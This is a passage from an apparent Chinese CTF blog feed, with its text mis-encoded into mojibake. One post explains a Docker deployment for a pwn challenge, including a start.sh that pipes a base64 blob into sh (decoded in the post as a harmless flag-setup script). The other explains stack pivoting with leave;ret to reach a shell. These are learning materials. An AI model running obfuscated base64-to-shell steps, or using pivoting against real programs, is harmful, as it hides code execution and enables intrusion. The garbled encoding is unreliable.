class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf <span class="comment">#å°†æœ¬åœ°çš„ctf.xinetdæ–‡ä»¶å¤åˆ¶åˆ°å®¹å™¨çš„/etc/xinetd.d/ctfä¸‹</span></span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh <span class="comment">#å°†æœ¬åœ°çš„start.shæ–‡ä»¶å¤åˆ¶åˆ°å®¹å™¨çš„æ ¹ç›®å½•ä¸‹</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh <span class="comment">#ç»™start.shå¯æ‰§è¡Œæƒé™</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./bin/ /home/ctf/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R root:ctf /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> -R 750 /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 740 /home/ctf/flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/start.sh&quot;</span>] <span class="comment">#åœ¨å®¹å™¨å¯åŠ¨æ—¶æ‰§è¡Œ/start.shæ–‡ä»¶</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">9999</span> <span class="comment">#å°†å®¹å™¨çš„9999ç«¯å£æš´éœ²å‡ºæ¥</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢å‡ºç°çš„å…³é”®è¯å¦‚ä¸‹ï¼š</p><ol><li><code>FROM</code>: æŒ‡å®šåŸºç¡€é•œåƒã€‚</li><li><code>RUN</code>: åœ¨é•œåƒä¸­æ‰§è¡Œå‘½ä»¤ã€‚</li><li><code>WORKDIR</code>: æŒ‡å®šå·¥ä½œç›®å½•ã€‚</li><li><code>COPY</code>: ä»æœ¬åœ°ä¸»æœºå¤åˆ¶æ–‡ä»¶&#x2F;æ–‡ä»¶å¤¹åˆ°å®¹å™¨ã€‚</li><li><code>CMD</code>: å®¹å™¨å¯åŠ¨æ—¶è¿è¡Œçš„å‘½ä»¤ã€‚</li><li><code>EXPOSE</code>: æš´éœ²å®¹å™¨çš„ç«¯å£ã€‚</li></ol><p>å…³äºè¿™ä¸ª <code>EXPOSE 9999</code> ï¼ŒæŒ‡çš„æ˜¯è¿è¡Œçš„æœåŠ¡å¯ä»¥é€šè¿‡9999ç«¯å£è¿›è¡Œè®¿é—®ï¼Œä½†è¿™ä¸æ„å‘³ç€è‡ªåŠ¨å°†å®¹å™¨çš„9999ç«¯å£æ˜ å°„åˆ°ä¸»æœºç«¯å£ï¼ŒEXPOSEä¸»è¦æ˜¯è®©æ„å»ºé•œåƒçš„äººå’Œè¿è¡Œå®¹å™¨çš„äººæœ‰ä¸€ä¸ªæ˜ç¡®çš„äº†è§£ï¼Œè¿™ä¸ªå®¹å™¨ä¸Šçš„ç«¯å£å“ªäº›æä¾›æœåŠ¡ï¼Œå¹¶ä¸”å¦‚æœéœ€è¦çš„è¯å¯ä»¥è¿è¡Œå®¹å™¨çš„æ—¶å€™æŠŠè¿™äº›ç«¯å£æ˜ å°„åˆ°ä¸»æœºç«¯å£ä¸Šã€‚å½“ç„¶ï¼Œè¿™ä¸ç®—å¼ºåˆ¶çš„ï¼Œè¿™åªæ˜¯ä¸€ä¸ªå»ºè®®æˆ–è€…æç¤ºï¼Œä¾ç„¶å¯ä»¥ä¸æŒ‰ç…§EXPOSEå£°æ˜çš„ç«¯å£æ¥ä½¿ç”¨ï¼Œä½ å¯ä»¥ä½¿ç”¨è‡ªå·±éœ€è¦çš„ç«¯å£æ˜ å°„å®¹å™¨ç«¯å£åˆ°ä¸»æœºä¸Šã€‚</p><h4 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h4><p>è¯¥æ–‡ä»¶ç”¨æ¥é…ç½®å’Œå¯åŠ¨å¤šå®¹å™¨Dockeråº”ç”¨ç¨‹åºçš„é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å®šä¹‰æ‰€æœ‰å®¹å™¨ï¼Œå¹¶åœ¨æ‰€æœ‰å®¹å™¨ä¹‹é—´å®šä¹‰è¿æ¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;3&#x27; #æŒ‡å®šäº†Docker Composeæ–‡ä»¶æ ¼å¼çš„ç‰ˆæœ¬</span><br><span class="line"></span><br><span class="line">services:   #    å®šä¹‰äº†ä¸€ä¸ªæœåŠ¡éƒ¨ç½²çš„é›†åˆ</span><br><span class="line">    pwn: # å®šä¹‰äº†ä¸€ä¸ªåä¸ºpwnçš„æœåŠ¡</span><br><span class="line">        build: ./ #   æŒ‡å®šäº†Docker Composeåº”è¯¥ä½¿ç”¨å½“å‰ç›®å½•ä¸‹çš„Dockerfileæ¥æ„å»ºé•œåƒ</span><br><span class="line">        image: pwn #  é•œåƒçš„åç§°ä¸ºpwn</span><br><span class="line">        ports:</span><br><span class="line">            - &quot;8888:9999&quot;  #å°†å®¹å™¨ä¸­çš„9999ç«¯å£æ˜ å°„åˆ°ä¸»æœºçš„8888ç«¯å£</span><br><span class="line">        pids_limit: 1024</span><br><span class="line">        # cpus: 0.5</span><br><span class="line">        container_name: pwn #å®¹å™¨çš„åç§°ä¸ºpwn</span><br><span class="line">        restart: unless-stopped</span><br><span class="line">        # privileged: true</span><br></pre></td></tr></table></figure><h4 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h4><p>ä¸»è¦åœ¨æ„å»ºå®Œé•œåƒåè¿è¡Œåœ¨å®¹å™¨ä¸­çš„è„šæœ¬ï¼Œç”¨äºåœ¨å®¹å™¨å¯åŠ¨æ—¶è¿›è¡Œåˆå§‹åŒ–æ“ä½œã€‚å¯ä»¥åœ¨Dockerfileæ–‡ä»¶ä¸­é…ç½®å…¶ä½œä¸ºå®¹å™¨å¯åŠ¨æ—¶çš„å…¥å£ç‚¹ï¼Œä»è€Œå®Œæˆä¸€äº›å¿…è¦çš„é…ç½®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"># Add your startup script</span><br><span class="line">echo dXNlcj1gbHMgL2hvbWVgCmlmIFsgISAkREFTRkxBRyBdO3RoZW4KIGVjaG8gZmxhZ3tURVNUX0RBU0ZMQUd9fHRlZSAvaG9tZS8kdXNlci9mbGFnIC9mbGFnCmVsc2UKIGVjaG8gJERBU0ZMQUd8dGVlIC9ob21lLyR1c2VyL2ZsYWcgL2ZsYWcKZmkKY2hvd24gcm9vdDokdXNlciAvaG9tZS8kdXNlci9mbGFnIC9mbGFnCmNobW9kIDc0MCAvaG9tZS8kdXNlci9mbGFnIC9mbGFnCg==|base64 -d|sh;</span><br><span class="line"># DO NOT DELETE</span><br><span class="line">/etc/init.d/xinetd start; #å¯åŠ¨xinetdæœåŠ¡</span><br><span class="line">sleep infinity;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯è¢«base64ç¼–ç è¿‡äº†ï¼Œç„¶åè§£ç ä¹‹åå†…å®¹å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user=`ls /home`</span><br><span class="line">if [ ! $DASFLAG ];then</span><br><span class="line"> echo flag&#123;TEST_DASFLAG&#125;|tee /home/$user/flag /flag</span><br><span class="line">else</span><br><span class="line"> echo $DASFLAG|tee /home/$user/flag /flag</span><br><span class="line">fi</span><br><span class="line">chown root:$user /home/$user/flag /flag</span><br><span class="line">chmod 740 /home/$user/flag /flag</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯è®¾ç½®çš„åŠ¨æ€flag</p><p>è¿™æ ·å°†dockerç¯å¢ƒæ‰“åŒ…å¥½åï¼Œç›´æ¥è¾“å…¥ <code>docker compose up -d </code> å‘½ä»¤ï¼Œå³å¯è‡ªåŠ¨éƒ¨ç½²ã€‚</p><p><strong>å½“ä½ ä½¿ç”¨docker compose up å‘½ä»¤å¯åŠ¨å®¹å™¨æ—¶ï¼ŒDocker Composeä¼šè¯»å–docker-compose.ymlæ–‡ä»¶å¹¶ä½¿ç”¨Dockerfileæ„å»ºé•œåƒï¼Œç„¶åæ ¹æ®æ–‡ä»¶ä¸­é…ç½®å¯åŠ¨å®¹å™¨ï¼Œå¹¶æ‰§è¡Œstart.shè„šæœ¬ã€‚ï¼Œå®¹å™¨å¯åŠ¨åï¼Œå°±å¯ä»¥é€šè¿‡æŒ‡å®šçš„ç«¯å£è®¿é—®å®¹å™¨ä¸­è¿è¡Œçš„åº”ç”¨æˆ–æœåŠ¡ã€‚</strong></p>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒæ­å»º </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºæ ˆè¿ç§»çš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/ee1dcd7f.html"/>
      <url>/posts/ee1dcd7f.html</url>
      
        <content type="html"><![CDATA[<h1 id="1ã€ä»€ä¹ˆæ˜¯æ ˆè¿ç§»"><a href="#1ã€ä»€ä¹ˆæ˜¯æ ˆè¿ç§»" class="headerlink" title="1ã€ä»€ä¹ˆæ˜¯æ ˆè¿ç§»"></a>1ã€ä»€ä¹ˆæ˜¯æ ˆè¿ç§»</h1><p>  è¿™é‡Œæˆ‘è°ˆè°ˆè‡ªå·±çš„ç†è§£ï¼Œç®€å•ä¸€å¥è¯ï¼š<strong>æ ˆè¿ç§»å°±æ˜¯æ¢ä¸ªåœ°æ–¹æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµ</strong>ï¼ˆè¿™ä¸ªæ¢çš„åœ°æ–¹æ—¢å¯ä»¥æ˜¯bssæ®µä¹Ÿå¯ä»¥æ˜¯æ ˆé‡Œé¢ï¼‰ã€‚</p><h1 id="2ã€ä¸ºä»€ä¹ˆè¦ä½¿ç”¨æ ˆè¿ç§»-amp-amp-ä»€ä¹ˆæ—¶å€™è¯¥ä½¿æ ˆè¿ç§»ï¼ˆä½¿ç”¨æ ˆè¿ç§»çš„æ¡ä»¶ï¼‰"><a href="#2ã€ä¸ºä»€ä¹ˆè¦ä½¿ç”¨æ ˆè¿ç§»-amp-amp-ä»€ä¹ˆæ—¶å€™è¯¥ä½¿æ ˆè¿ç§»ï¼ˆä½¿ç”¨æ ˆè¿ç§»çš„æ¡ä»¶ï¼‰" class="headerlink" title="2ã€ä¸ºä»€ä¹ˆè¦ä½¿ç”¨æ ˆè¿ç§»&amp;&amp;ä»€ä¹ˆæ—¶å€™è¯¥ä½¿æ ˆè¿ç§»ï¼ˆä½¿ç”¨æ ˆè¿ç§»çš„æ¡ä»¶ï¼‰"></a>2ã€ä¸ºä»€ä¹ˆè¦ä½¿ç”¨æ ˆè¿ç§»&amp;&amp;ä»€ä¹ˆæ—¶å€™è¯¥ä½¿æ ˆè¿ç§»ï¼ˆä½¿ç”¨æ ˆè¿ç§»çš„æ¡ä»¶ï¼‰</h1><p>è¨€ç®€æ„èµ…çš„æ¥è¯´ï¼Œå°±æ˜¯å¯æº¢å‡ºçš„é•¿åº¦ä¸å¤Ÿç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦ä¹ˆæ˜¯æ²¡åŠæ³•æº¢å‡ºåˆ°è¿”å›åœ°å€åªèƒ½æº¢å‡ºè¦†ç›–ebpï¼Œè¦ä¹ˆæ˜¯åˆšå¥½æº¢å‡ºè¦†ç›–äº†è¿”å›åœ°å€ä½†æ˜¯å—payloadé•¿åº¦é™åˆ¶ï¼Œæ²¡åŠæ³•æŠŠå‚æ•°ç»™å†™åˆ°è¿”å›åœ°å€åé¢ã€‚æ€»ä¹‹å‘¢ï¼Œå°±æ˜¯èƒ½å¤Ÿæº¢å‡ºçš„é•¿åº¦ä¸å¤Ÿï¼Œæ²¡åŠæ³•GetShellï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰éœ€è¦æ¢ä¸€ä¸ªåœ°æ–¹GetShellã€‚</p><p>ä½¿ç”¨æ ˆè¿ç§»çš„æ¡ä»¶ï¼š</p><p>1ã€è¦èƒ½å¤Ÿæ ˆæº¢å‡ºï¼Œè¿™ç‚¹å°¤å…¶é‡è¦ï¼Œæœ€èµ·ç ä¹Ÿè¦æº¢å‡ºè¦†ç›–ä¸ªebp</p><p>2ã€éœ€è¦æœ‰ä¸ªå¯å†™çš„åœ°æ–¹ï¼ˆå°±æ˜¯ä½ è¦GetShellçš„åœ°æ–¹ï¼‰ï¼Œå…ˆè€ƒè™‘bssæ®µï¼Œæœ€åå†è€ƒè™‘å†™åˆ°æ ˆä¸­</p><h1 id="3ã€å­¦ä¹ æ ˆè¿ç§»éœ€è¦è‡ªèº«æŒæ¡ä»€ä¹ˆçŸ¥è¯†"><a href="#3ã€å­¦ä¹ æ ˆè¿ç§»éœ€è¦è‡ªèº«æŒæ¡ä»€ä¹ˆçŸ¥è¯†" class="headerlink" title="3ã€å­¦ä¹ æ ˆè¿ç§»éœ€è¦è‡ªèº«æŒæ¡ä»€ä¹ˆçŸ¥è¯†"></a>3ã€å­¦ä¹ æ ˆè¿ç§»éœ€è¦è‡ªèº«æŒæ¡ä»€ä¹ˆçŸ¥è¯†</h1><pre><code>â‘ éœ€è¦æŒæ¡æ±‡ç¼–åŸºç¡€â‘¡è¾ƒä¸ºç†Ÿæ‚‰æ ˆç»“æ„â‘¢ä»¥åŠæ˜ç™½å‡½æ•°è°ƒç”¨ä¸ç»“æŸæ—¶æ ˆçš„å˜åŒ–</code></pre><p>PSï¼šæœ¬æ–‡è®¨è®ºçš„ä¸€åˆ‡åŸç†ï¼Œéƒ½æ˜¯é’ˆå¯¹äº32ä½ç¨‹åºçš„æ ˆè¿ç§»æ¥è¯´çš„ï¼Œä¸è¿‡ä¾‹é¢˜é‡Œé¢æœ‰ä¸€é“æ˜¯64ä½çš„æ ˆè¿ç§»</p><h1 id="4ã€æ ˆè¿ç§»çš„åŸç†"><a href="#4ã€æ ˆè¿ç§»çš„åŸç†" class="headerlink" title="4ã€æ ˆè¿ç§»çš„åŸç†"></a>4ã€æ ˆè¿ç§»çš„åŸç†</h1><h3 id="ebpå’Œebpçš„å†…å®¹æ˜¯ä¸¤ç äº‹ï¼ˆå®ƒä»¬äºŒè€…çš„å…³ç³»å°±å¦‚åŒcè¯­è¨€ä¸­-æŒ‡é’ˆpä¸-pçš„å…³ç³»ï¼‰"><a href="#ebpå’Œebpçš„å†…å®¹æ˜¯ä¸¤ç äº‹ï¼ˆå®ƒä»¬äºŒè€…çš„å…³ç³»å°±å¦‚åŒcè¯­è¨€ä¸­-æŒ‡é’ˆpä¸-pçš„å…³ç³»ï¼‰" class="headerlink" title="ebpå’Œebpçš„å†…å®¹æ˜¯ä¸¤ç äº‹ï¼ˆå®ƒä»¬äºŒè€…çš„å…³ç³»å°±å¦‚åŒcè¯­è¨€ä¸­,æŒ‡é’ˆpä¸*pçš„å…³ç³»ï¼‰"></a><font color=red>ebpå’Œebpçš„å†…å®¹æ˜¯ä¸¤ç äº‹ï¼ˆå®ƒä»¬äºŒè€…çš„å…³ç³»å°±å¦‚åŒcè¯­è¨€ä¸­,æŒ‡é’ˆpä¸*pçš„å…³ç³»ï¼‰</font></h3><p><img src="/../img/2706180-20220118102346730-1500206355.png"></p><p>ebpæ˜¯0xffe7a9e8ï¼Œå®ƒçš„å†…å®¹æ˜¯0xffe7aa38ï¼Œè€Œè¿™ä¸ªå†…å®¹ä¹Ÿæ˜¯ä¸€ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€é‡Œé¢è£…çš„åˆæ˜¯0x8059b50ã€‚<u>ebpæœ¬èº«å¤§éƒ¨åˆ†æ—¶å€™éƒ½æ˜¯ä¸€ä¸ªåœ°å€ï¼ˆç¨‹åºæ­£å¸¸è¿è¡Œæƒ…å†µä¸‹ï¼‰ï¼Œè€Œebpçš„å†…å®¹å¯ä»¥æ˜¯åœ°å€ï¼Œä¹Ÿå¯ä»¥ä¸æ˜¯åœ°å€ï¼ˆç¨‹åºæ­£å¸¸è¿è¡Œä¸‹ï¼Œebpçš„å†…å®¹ä¹Ÿè£…çš„æ˜¯åœ°å€ï¼Œä½†å¦‚æœä½ è¿›è¡Œæº¢å‡ºçš„è¯ï¼Œè‡ªç„¶å¯ä»¥ä¸è£…æˆåœ°å€ï¼‰</u>ã€‚æˆ‘è¿™é‡Œæƒ³å¼ºè°ƒçš„æ˜¯ebpå’Œebpçš„å†…å®¹è¿™ä¸¤è€…ä¸€å®šä¸èƒ½æ··ä¸ºä¸€è°ˆï¼Œåœ¨é˜…è¯»ä¸‹é¢çš„å†…å®¹æ˜¯ï¼Œä¸€å®šè¦æ³¨æ„åŒºåˆ†ä¸¤è€…ã€‚</p><h2 id="æ ˆè¿ç§»çš„æ ¸å¿ƒï¼Œå°±åœ¨äºä¸¤æ¬¡çš„leave-retæŒ‡ä»¤ä¸Šé¢"><a href="#æ ˆè¿ç§»çš„æ ¸å¿ƒï¼Œå°±åœ¨äºä¸¤æ¬¡çš„leave-retæŒ‡ä»¤ä¸Šé¢" class="headerlink" title="æ ˆè¿ç§»çš„æ ¸å¿ƒï¼Œå°±åœ¨äºä¸¤æ¬¡çš„leave;retæŒ‡ä»¤ä¸Šé¢"></a><strong>æ ˆè¿ç§»çš„æ ¸å¿ƒï¼Œå°±åœ¨äºä¸¤æ¬¡çš„leave;retæŒ‡ä»¤ä¸Šé¢</strong></h2><h3 id="åœ¨è¯´æ˜æ ˆè¿ç§»åŸç†ä¹‹å‰ï¼Œæˆ‘å…ˆä»‹ç»ä¸€ä¸‹leaveå’Œretå…·ä½“æ˜¯åœ¨å¹²ä»€ä¹ˆï¼Œè¿™é‡Œå»ºè®®ä»”ç»†çœ‹ä¸€ä¸‹ï¼Œä¸ç„¶åé¢è¿ç»­ä¸¤ä¸ªleave-retï¼Œå®¹æ˜“æè¿·äº†ï¼‰ã€‚"><a href="#åœ¨è¯´æ˜æ ˆè¿ç§»åŸç†ä¹‹å‰ï¼Œæˆ‘å…ˆä»‹ç»ä¸€ä¸‹leaveå’Œretå…·ä½“æ˜¯åœ¨å¹²ä»€ä¹ˆï¼Œè¿™é‡Œå»ºè®®ä»”ç»†çœ‹ä¸€ä¸‹ï¼Œä¸ç„¶åé¢è¿ç»­ä¸¤ä¸ªleave-retï¼Œå®¹æ˜“æè¿·äº†ï¼‰ã€‚" class="headerlink" title="(åœ¨è¯´æ˜æ ˆè¿ç§»åŸç†ä¹‹å‰ï¼Œæˆ‘å…ˆä»‹ç»ä¸€ä¸‹leaveå’Œretå…·ä½“æ˜¯åœ¨å¹²ä»€ä¹ˆï¼Œè¿™é‡Œå»ºè®®ä»”ç»†çœ‹ä¸€ä¸‹ï¼Œä¸ç„¶åé¢è¿ç»­ä¸¤ä¸ªleave;retï¼Œå®¹æ˜“æè¿·äº†ï¼‰ã€‚"></a>(åœ¨è¯´æ˜æ ˆè¿ç§»åŸç†ä¹‹å‰ï¼Œæˆ‘å…ˆä»‹ç»ä¸€ä¸‹leaveå’Œretå…·ä½“æ˜¯åœ¨å¹²ä»€ä¹ˆï¼Œè¿™é‡Œå»ºè®®ä»”ç»†çœ‹ä¸€ä¸‹ï¼Œä¸ç„¶åé¢è¿ç»­ä¸¤ä¸ªleave;retï¼Œå®¹æ˜“æè¿·äº†ï¼‰ã€‚</h3><p>leaveæŒ‡ä»¤å³ä¸ºmov esp ebp;pop ebpå…ˆå°†ebpèµ‹ç»™espï¼Œæ­¤æ—¶espä¸ebpä½äºäº†ä¸€ä¸ªåœ°å€ï¼Œä½ å¯ä»¥ç°åœ¨æŠŠå®ƒä»¬æŒ‡å‘çš„é‚£ä¸ªåœ°å€ï¼Œå³å½“æˆæ ˆé¡¶åˆå¯ä»¥å½“æˆæ˜¯æ ˆåº•ã€‚ç„¶åpop ebpï¼Œå°†<strong>æ ˆé¡¶çš„å†…å®¹</strong>å¼¹å…¥ebp<font color=red>ï¼ˆæ­¤æ—¶æ ˆé¡¶çš„å†…å®¹ä¹Ÿå°±æ˜¯ebpçš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´ç°åœ¨æŠŠebpçš„å†…å®¹èµ‹ç»™äº†ebpï¼‰</font>ã€‚å› ä¸ºespè¦æ—¶åˆ»æŒ‡å‘æ ˆé¡¶ï¼Œæ—¢ç„¶æ ˆé¡¶çš„å†…å®¹éƒ½å¼¹èµ°äº†ï¼Œé‚£ä¹ˆespè‡ªç„¶è¦å¾€ä¸‹æŒªä¸€ä¸ªå†…å­˜å•å…ƒã€‚å…·ä½“å®ç°è¯·è§ä¸‹å›¾ã€‚<font color=red><strong>ps:ä¸‹é¢å‡ å¼ å›¾ç‰‡ï¼Œå½“æ—¶åˆ¶ä½œçš„æ—¶å€™ï¼Œæœ‰ç‚¹ç²—å¿ƒï¼ŒæŠŠleaveå†™æˆleveläº†ï¼Œå› æ­¤è¯»çš„æ—¶å€™æ³¨æ„ä¸‹è¿™é‡Œå°±å¥½äº†ã€‚</strong></font></p><p><img src="/../img/2706180-20220118102443458-1381923387.png"></p><pre><code>retæŒ‡ä»¤ä¸ºpop eipï¼Œè¿™ä¸ªæŒ‡ä»¤å°±æ˜¯æŠŠæ ˆé¡¶çš„å†…å®¹å¼¹è¿›äº†eipï¼ˆå°±æ˜¯ä¸‹ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œçš„åœ°å€ï¼‰å…·ä½“å®ç°è¯·è§ä¸‹å›¾ã€‚</code></pre><p><img src="/../img/2706180-20220118102755803-79970067.png"></p><h2 id="æ ˆè¿ç§»åŸç†ï¼š"><a href="#æ ˆè¿ç§»åŸç†ï¼š" class="headerlink" title="æ ˆè¿ç§»åŸç†ï¼š"></a>æ ˆè¿ç§»åŸç†ï¼š</h2><p><strong>ï¼ˆå…ˆè®¨è®ºmainå‡½æ•°é‡Œçš„æ ˆè¿ç§»ï¼‰</strong>é¦–å…ˆ<strong>åˆ©ç”¨æº¢å‡ºæŠŠebpçš„å†…å®¹</strong>ç»™ä¿®æ”¹æ‰ï¼ˆ<strong>ä¿®æ”¹æˆæˆ‘ä»¬è¦è¿ç§»çš„é‚£ä¸ªåœ°å€</strong>ï¼‰ï¼Œå¹¶ä¸”<strong>æŠŠè¿”å›åœ°å€å¡«å……æˆleave;retæŒ‡ä»¤çš„åœ°å€ï¼ˆå› ä¸ºæˆ‘ä»¬éœ€è¦ä¸¤æ¬¡leave;retï¼‰</strong>ï¼ˆå¦‚æœä¸ä¼šæ‰¾æŒ‡ä»¤åœ°å€çš„è¯ï¼Œæœ¬æ–‡æœ€åçš„é™„å½•ä¸­ï¼Œæœ‰ä»‹ç»ï¼‰æ­¤æ—¶mainå‡½æ•°å‡†å¤‡ç»“æŸã€‚</p><p><font color=red>å¼€å§‹æ‰§è¡Œç¬¬ä¸€ä¸ªleave</font>ï¼Œæ­¤æ—¶mov esp ebpè®©ä¸¤ä¸ªæŒ‡é’ˆå¤„äºåŒä¸€ä½ç½®ï¼Œç°åœ¨è¿˜æ˜¯æ­£å¸¸è¿è¡Œï¼Œæ¥ç€æ‰§è¡Œpop ebpå°±å‡ºç°äº†å¼‚å¸¸ï¼Œ<u>å› ä¸ºæ­¤æ—¶ebpçš„å†…å®¹è¢«ä¿®æ”¹æˆäº†è¦è¿ç§»çš„åœ°å€</u>ï¼Œå› æ­¤æ‰§è¡Œäº†pop ebpï¼Œebpå¹¶æ²¡æœ‰å¼¹åˆ°å®ƒæœ¬åº”è¯¥å»çš„åœ°æ–¹ï¼ˆæ­£å¸¸æƒ…å†µä¸‹ï¼Œebpé‡Œè£…çš„å†…å®¹ï¼Œå°±æ˜¯å®ƒæ¥ä¸‹æ¥æ‰§è¡Œpop ebpè¦å»çš„åœ°æ–¹ï¼‰ï¼Œ<u>è€Œæ˜¯å¼¹åˆ°äº†æˆ‘ä»¬ä¿®æ”¹çš„é‚£ä¸ªè¿ç§»åçš„åœ°å€</u>ï¼Œæ¥ç€æ‰§è¡Œäº†pop eipï¼Œeipé‡Œæ”¾çš„åˆæ˜¯leaveçš„åœ°å€ï¼ˆå› ä¸ºæ­¤æ—¶æ˜¯æŠŠè¿”å›åœ°å€å¼¹ç»™eipï¼Œè¿™ä¸ªè¿”å›åœ°å€ï¼Œæˆ‘ä»¬å…ˆç»™è¦†ç›–æˆleave;retçš„åœ°å€ã€‚<font color=red>ä½ å¯èƒ½ä¼šé—®ï¼Œå¦‚æœè¿™ä¸ªè¿”å›åœ°å€ä¸æ”¾æˆleaveï¼›retçš„åœ°å€ï¼Œè¡Œä¸è¡Œï¼Ÿå¾ˆæ˜æ˜¾æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºæˆ‘ä»¬æƒ³è¦å®ç°æ ˆè¿ç§»ï¼Œå°±å¿…é¡»æ‰§è¡Œä¸¤ä¸ªleaveï¼›retï¼Œmainå‡½æ•°æ­£å¸¸ç»“æŸï¼Œåªæœ‰ä¸€ä¸ªlevel;retï¼Œå› æ­¤æˆ‘ä»¬åœ¨è¿™é‡Œå¿…é¡»è¦å®ƒçš„è¿”å›åœ°å€å†™æˆleave;retåœ°å€ï¼Œä»¥æ¥è¿›è¡Œç¬¬äºŒæ¬¡leave;ret</font>ï¼‰ï¼Œç»“æœåˆæ‰§è¡Œäº†leave<font color=red>ï¼ˆç°åœ¨æ‰§è¡Œç¬¬äºŒä¸ªleave)</font>ï¼Œæ­¤æ—¶æ‰æ˜¯åˆ°äº†æ ˆè¿ç§»çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œ<strong>mov esp ebpï¼Œebpèµ‹ç»™äº†espï¼Œæ­¤æ—¶espæŒªåˆ°äº†ebpçš„ä½ç½®ï¼Œå¯ä½ åˆ«å¿˜äº†ï¼Œç°åœ¨çš„ebpå·²ç»è¢«ä¿®æ”¹åˆ°äº†æˆ‘ä»¬è¿ç§»åçš„åœ°å€ï¼Œå› æ­¤ç°åœ¨espä¹Ÿåˆ°äº†è¿ç§»åçš„åœ°å€ï¼Œæ¥ç€pop ebpï¼ŒæŠŠè¿™ä¸ªæ ˆé¡¶çš„å†…å®¹å¼¹ç»™ebpï¼ŒespæŒ‡å‘äº†ä¸‹ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œæ­¤æ—¶æˆ‘ä»¬åªéœ€è¦å°†è¿™ä¸ªå†…å­˜å•å…ƒæ”¾å…¥systemå‡½æ•°çš„åœ°å€ï¼Œæœ€åæ‰§è¡Œäº†pop eipï¼Œæ­¤æ—¶systemå‡½æ•°è¿›å…¥äº†eipä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥æˆåŠŸGetShelläº†</strong>ã€‚ç»“åˆæè¿°è¿‡ç¨‹ä¸ä¸‹å›¾åˆ†æï¼Œæ•ˆæœæ›´ä½³ï¼ï¼ˆä¸‹å›¾æ ˆä¸­å¡«å……çš„aaaaä»¥åŠsystem_addrå’Œ&#x2F;bin&#x2F;shç­‰ç­‰ï¼Œéƒ½æ˜¯payloadä¸€èµ·å‘é€è¿‡å»çš„ï¼Œæœ€åçš„ä¸¤ä¸ªaaaaä»…ä»…æ˜¯èµ·åˆ°äº†ä¸€ä¸ªå¡«å……çš„æ•ˆæœï¼‰å½“ç„¶ï¼Œå…·ä½“çš„payloadéƒ½æ˜¯æ ¹æ®é¢˜ç›®æ¥åˆ†æçš„ï¼Œè¿™é‡Œæˆ‘åªæ˜¯ä¸¾ä¸ªä¾‹å­ã€‚</p><p><img src="/../img/2706180-20220118102850680-2070302005.png"></p><p><img src="/../img/2706180-20220118103002284-1311363088.png"></p><p>æœ€åæ¥æ€»ç»“ä¸€ä¸‹åŸç†ï¼Œæ ¸å¿ƒæ˜¯åˆ©ç”¨ä¸¤æ¬¡çš„leave;retï¼Œ<strong>ç¬¬ä¸€æ¬¡leave ret;å°†ebpç»™æ”¾å…¥æˆ‘ä»¬æŒ‡å®šçš„ä½ç½®ï¼ˆè¿™ä¸ªä½ç½®çš„å°±æ˜¯è¿ç§»åçš„æ‰€åœ¨ä½ç½®ï¼‰</strong>ï¼Œ<strong>ç¬¬äºŒæ¬¡å°†espä¹Ÿè¿ç§»åˆ°è¿™ä¸ªä½ç½®ï¼Œå¹¶ä¸”pop ebpä¹‹åï¼Œespä¹ŸæŒ‡å‘äº†ä¸‹ä¸€ä¸ªå†…å­˜å•å…ƒï¼ˆæ­¤æ—¶è¿™é‡Œæ”¾çš„å°±æ˜¯systemå‡½æ•°çš„pltåœ°å€ï¼‰</strong>ï¼Œæœ€ç»ˆæˆåŠŸGetShellã€‚</p><p>åŸç†å¦‚ä¸Šï¼Œé‡è§ä¸åŒæ ˆè¿ç§»çš„é¢˜ç›®ä¹Ÿæ˜¯æ ¹æœ¬æ ¸å¿ƒä¸‡å˜ä¸ç¦»å…¶å®—ã€‚</p><h1 id="5ã€æ ˆè¿ç§»çš„å®æˆ˜è¿ç”¨"><a href="#5ã€æ ˆè¿ç§»çš„å®æˆ˜è¿ç”¨" class="headerlink" title="5ã€æ ˆè¿ç§»çš„å®æˆ˜è¿ç”¨"></a>5ã€æ 